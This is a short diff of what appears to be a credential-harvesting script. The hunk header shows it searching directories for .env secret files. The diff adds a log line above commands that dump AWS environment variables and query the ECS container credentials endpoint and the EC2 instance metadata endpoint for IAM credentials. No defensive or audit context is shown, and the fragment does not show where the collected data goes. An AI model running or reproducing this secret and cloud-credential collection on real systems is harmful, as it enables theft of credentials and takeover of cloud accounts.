@@ -142,6 +142,7 @@ walk(all_roots, 6, lambda fp, fn: fn in {'.env', '.env.local', '.env.production'
 
 log.info("=== AWS env + metadata ===")
 run('env | grep AWS_')
+log.info("Testing AWS metadata endpoint")
 run('curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI} 2>/dev/null || true')
 run('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true')
 
